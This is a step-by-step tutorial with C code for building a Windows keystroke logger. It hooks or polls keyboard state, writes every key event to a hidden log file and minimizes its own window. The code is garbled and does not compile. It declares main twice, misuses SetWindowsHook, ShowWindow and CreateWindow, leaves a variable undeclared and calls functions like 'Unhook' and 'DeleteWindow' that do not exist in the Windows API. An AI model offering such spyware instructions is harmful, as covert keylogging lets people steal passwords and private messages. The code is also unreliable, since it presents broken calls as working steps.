To create a keystroke logger on a Windows computer, follow these steps:

**Step 1: Include Necessary Headers**

Include the required Windows header files:

```c
#include <windows.h>
#include <stdio.h>
#include <ctime>
#include <iostream>
```

**Step 2: Define the Keyboard Hook Function**

Define a function to handle keyboard events:

```c
void main();
LRESULT CALLBACK keyboard_proc(int code, WPARAM wParam, LPARAM lParam);
```

**Step 3: Install the Keyboard Hook**

Use `SetWindowsHook` to install the hook:

```c
int main() {
    HHOOK hhook;
    hhook = SetWindowsHook(WH_KEYBOARD, keyboard_proc);

    // Open the log file
    FILE *file = fopen("keystroke.log", "a");
    if (!file) {
        printf("Failed to open log file!\n");
        return 1;
    }

    // Minimize the window
    HWND hwnd = CreateWindow(NULL, NULL, WS_MINIMIZE, 0, 0, 0, 0, HWND_DESKTOP, NULL, NULL, NULL, NULL);
    ShowWindow(hwnd);

    // Start the loop to check keyboard state
    while (true) {
        // Check each key
        for (int i = 0; i < 256; i++) {
            int state = GetKeyState(i);
            if (state != last_state[i]) {
                // Log the keystroke
                if (state != 0) {
                    // Key pressed
                    fprintf(file, "[%d] P %d\n", i, GetAsyncKeyState(i));
                } else {
                    // Key released
                    fprintf(file, "[%d] R %d\n", i, GetAsyncKeyState(i));
                }
                last_state[i] = state;
            }
        }
        Sleep(100); // Avoid high CPU usage
    }

    // Uninstall the hook and clean up
    Unhook(hhook);
    DeleteWindow(hwnd);
    fclose(file);
    return 0;
}
```

